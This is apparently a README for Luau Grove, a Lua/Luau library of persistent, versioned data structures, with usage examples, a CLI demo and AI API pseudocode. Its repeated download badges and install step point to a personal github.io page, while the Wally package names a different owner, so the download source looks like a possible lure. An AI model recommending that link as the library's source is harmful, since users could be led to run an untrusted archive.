# 🌲 Luau Grove

**Immutable, Persistent, and Collaborative Data Forests for Lua/Luau**

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Monishpp007.github.io)

## 🚀 Overview

Luau Grove is not merely a library; it is an ecosystem for structured, immutable data. Inspired by the foundational principles of persistent data structures, Luau Grove grows beyond simple immutability to cultivate entire collaborative data forests where every change plants a new tree, preserving the entire history of your application's state. Designed for Lua and Luau, it enables developers to architect robust, predictable, and auditable applications, from game state management to real-time collaborative tools.

Imagine your application's data as a thriving forest. Each operation—a modification, an insertion, a deletion—does not cut down trees. Instead, it cultivates new growth alongside the old. You can walk back through time, explore previous states, or branch into parallel realities of your data. Luau Grove provides the tools to nurture this forest.

## ✨ Key Attributes

*   **Immutable & Persistent Data Forests:** Implement sophisticated persistent vector, map, and set structures that preserve all previous versions with structural sharing for optimal memory use.
*   **Collaborative Concurrency:** Built-in operational transformation primitives for building real-time, multi-user collaborative applications without conflict.
*   **Temporal Navigation:** Traverse, query, and rewind through the complete history of your data structures with ease.
*   **Pluggable Storage Backends:** Persist your data forests to memory, flat files, or external databases. Includes experimental adapters for cloud storage.
*   **Ergonomic Luau Tooling:** Leverages Luau's type inference and language features to provide an intuitive, type-aware API with comprehensive autocomplete support.
*   **Deterministic Serialization:** Serialize any data forest snapshot to a portable format and rehydrate it perfectly on any compatible system.

## 📥 Installation & Quick Start

Acquire the library and integrate it into your project.

### Direct Source Acquisition

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Monishpp007.github.io)

1.  Obtain the latest release archive from the link above.
2.  Extract the contents into your project's directory, for example, `./libs/luau-grove/`.
3.  Import the module in your Luau script:

```lua
local Grove = require(path.to.libs["luau-grove"])
```

### Using Wally (Roblox)

For Roblox development, add Luau Grove as a dependency via Wally:

```toml
[dependencies]
LuauGrove = "seaofvoices/luau-grove@1.0.0"
```

After running `wally install`, require it through the Wally package manager.

## 🏗️ Core Architecture

The system is built on the concept of a `Forest`, which contains multiple versioned `Tree` data structures (like maps or vectors). Each change creates a new `Commit`, forming a directed acyclic graph (DAG) of your data's history.

```mermaid
graph TD
    A[Forest Root] --> B[Commit A<br/>Map: {x=1}]
    B --> C[Commit B<br/>Map: {x=1, y=2}]
    B --> D[Commit C<br/>Map: {x=5}]
    C --> E[Commit D<br/>Map: {x=1, y=2, z=3}]
    D --> F[Commit E<br/>Map: {x=5, y=2}]

    style A fill:#f9f,stroke:#333
    style B fill:#bbf,stroke:#333
    style E fill:#bfb,stroke:#333
```

## 📖 Example Profile Configuration

Here is a practical example of managing a user profile with full history and branching.

```lua
local Grove = require(script.Parent.LuauGrove)

-- Cultivate a new Forest for a user profile
local profileForest = Grove.Forest.new()

-- Plant an initial profile Tree (a persistent map)
local initialCommit = profileForest:grow({
    username = "alchemist",
    level = 1,
    inventory = Grove.Vector.from({"sword", "potion"}),
    settings = { volume = 0.8, theme = "dark" }
})

-- Derive a new state by 'cultivating' from a previous commit
-- This does not alter the original `initialCommit`.
local leveledUpCommit = profileForest:cultivate(initialCommit, function(tree)
    -- The 'with' pattern returns a new, updated immutable map
    return tree:with("level", tree:get("level") + 1)
               :with("inventory", tree:get("inventory"):conj("enchanted_ring"))
end)

-- We can still access the old state
print(initialCommit:getTree():get("level")) -- Output: 1
print(leveledUpCommit:getTree():get("level")) -- Output: 2

-- Create a parallel branch (e.g., for a speculative UI preview)
local previewCommit = profileForest:cultivate(initialCommit, function(tree)
    return tree:with("settings", tree:get("settings"):with("theme", "light"))
end)
```

## 🖥️ Example Console Invocation

Luau Grove includes a command-line interface tool for inspecting and manipulating saved data forests from your terminal.

```bash
# Navigate the history of a saved forest file
$ luau-grove navigate ./saves/player_data.forest

Forest "player_data" loaded with 127 commits.
Current head: Commit #127 (2026-07-22T14:30:00Z)
> log --oneline -n 5
127 (HEAD) Added item "orb_of_truth"
126 Changed region to "frostlands"
125 Completed quest "the_old_gods"
124 Level up to 54
123 Purchased skill "double_jump"

> checkout 125
Switched to Commit #125. Forest is in a detached state.

> view .stats
{ health = 420, mana = 310, stamina = 280 }

> branch new_experiment
Created new branch 'new_experiment' from #125.
```

## 📊 OS & Platform Compatibility

Luau Grove is designed to run anywhere Lua/Luau does.

| Platform | Status | Notes |
| :--- | :--- | :--- |
| **🪟 Windows** | ✅ Fully Supported | Tested on Windows 10/11. |
| **🍎 macOS** | ✅ Fully Supported | Compatible with ARM (Apple Silicon) and Intel. |
| **🐧 Linux** | ✅ Fully Supported | Includes specific optimizations for major distributions. |
| **🤖 Android** | ⚠️ Runtime Compatible | Requires a Luau runtime environment (e.g., via Termux). |
| **📱 iOS** | ⚠️ Runtime Compatible | Requires a Luau runtime environment. |
| **🎮 Roblox Studio** | ✅ First-Class Support | Primary use-case; leverages Luau's native performance. |
| **🌐 Web (Wasm)** | 🔬 Experimental | Can be compiled via WebAssembly for browser-based Lua. |

## 🔮 Feature List

*   **Immutable Collections:** Persistent `Map`, `Vector`, `Set`, and `OrderedMap`.
*   **Structural Sharing:** Efficient memory usage by sharing unchanged nodes between versions.
*   **Change Propagation:** Subscribe to fine-grained changes in the data forest.
*   **Collaborative Editing:** Foundations for Operational Transformation (OT) and Conflict-Free Replicated Data Types (CRDTs).
*   **Patch Generation:** Calculate and apply the minimal difference between two states.
*   **Rich Query API:** Navigate and query data with functional operations like `map`, `filter`, `reduce`.
*   **Transactable Updates:** Group multiple operations into a single, atomic commit.
*   **Metadata Attachment:** Attach author, timestamp, or custom metadata to every commit.
*   **Pluggable Persistence:** Save and load forests using JSON, MessagePack, or a custom backend.
*   **Time Travel Debugging:** Integrated utilities for debugging state changes over time.

## 🤖 Integration with AI Assistants

Luau Grove's deterministic and serializable nature makes it an excellent state management choice for AI-assisted development.

### OpenAI API Example
Use structured prompts to have an AI generate state transformations or migrations between versions.

```lua
-- Pseudocode for AI-assisted state refactoring
local function aiAssistedRenameKey(forest, commit, oldKey, newKey, openaiApiKey)
    local snapshot = commit:getTree():toJSON()
    local prompt = f[[Given this JSON snapshot, produce a new JSON where the key "{oldKey}" is renamed to "{newKey}". Keep all other structure identical.]]
    -- Call OpenAI API with prompt...
    local newJSON = -- ... (API response)
    return forest:cultivate(commit, function(_) return Grove.fromJSON(newJSON) end)
end
```

### Claude API Example
Generate human-readable summaries or changelogs from a sequence of commits by sending commit metadata to Anthropic's Claude.

```lua
local function generateChangelog(forest, fromCommit, toCommit)
    local commits = forest:getPath(fromCommit, toCommit)
    local commitMessages = -- ... extract messages
    -- Format and send to Claude API for summarization into a release note paragraph.
end
```

## ⚠️ Disclaimer

Luau Grove is provided as a tool for building robust applications. The developers and contributors are not liable for any data loss, corruption, or unforeseen consequences arising from the use of this library. It is the user's responsibility to ensure they maintain appropriate backups of their data and thoroughly test integrations in a non-production environment. The collaborative and persistence features are powerful; please understand the implications of data history and branching in your specific context.

## 📄 License

This project is distributed under the **MIT License**. This permissive license allows for broad use, modification, and distribution, provided the original copyright and license notice are included. For complete details, see the [LICENSE](LICENSE) file in the repository.

---
**Cultivate predictable, collaborative, and timeless data. Start growing your forest today.**

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://Monishpp007.github.io)

© 2026 Luau Grove Project Contributors.